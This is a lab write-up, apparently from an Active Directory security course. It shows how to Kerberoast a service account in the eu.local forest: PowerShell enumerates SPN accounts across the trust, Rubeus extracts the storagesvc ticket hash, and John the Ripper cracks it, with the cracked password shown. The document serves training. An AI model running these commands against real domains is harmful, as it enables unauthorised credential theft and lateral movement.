# Hands-ON 22:
```
Find a service account in the eu.local forest and Kerberoast its password.
```

## Index Of Content:
  1. [Find service accounts](#find-service-accounts)  

## Find service accounts


```
 Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName -Server $_.Name}


DistinguishedName    : CN=krbtgt,CN=Users,DC=eu,DC=local
Enabled              : False
GivenName            :
Name                 : krbtgt
ObjectClass          : user
ObjectGUID           : a36265f2-2db1-4555-acc2-e9736fc1b6f6
SamAccountName       : krbtgt
ServicePrincipalName : {kadmin/changepw}
SID                  : S-1-5-21-3657428294-2017276338-1274645009-502
Surname              :
UserPrincipalName    :

DistinguishedName    : CN=storagesvc,CN=Users,DC=eu,DC=local
Enabled              : True
GivenName            : storage
Name                 : storagesvc
ObjectClass          : user
ObjectGUID           : 041fedb0-a442-4cdf-af34-6559480a2d74
SamAccountName       : storagesvc
ServicePrincipalName : {MSSQLSvc/eu-file.eu.local}
SID                  : S-1-5-21-3657428294-2017276338-1274645009-1106
Surname              : svc
UserPrincipalName    : storagesvc

```

Request hashes using rubeus from eu.local of kerberoast users:

```
C:\Users\studentuser17>C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : storagesvc
[*] Target Domain          : eu.local
[*] Searching path 'LDAP://EU-DC.eu.local/DC=eu,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=storagesvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\euhashes.txt

[*] Roasted hashes written to : C:\AD\Tools\euhashes.txt

```
Perform a locla bruteforce attack:
```
C:\Users\studentuser17>C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\euhashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Qwerty@123       (?)
1g 0:00:00:00 DONE (2023-03-01 11:43) 76.92g/s 59076p/s 59076c/s 59076C/s password..9999
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```
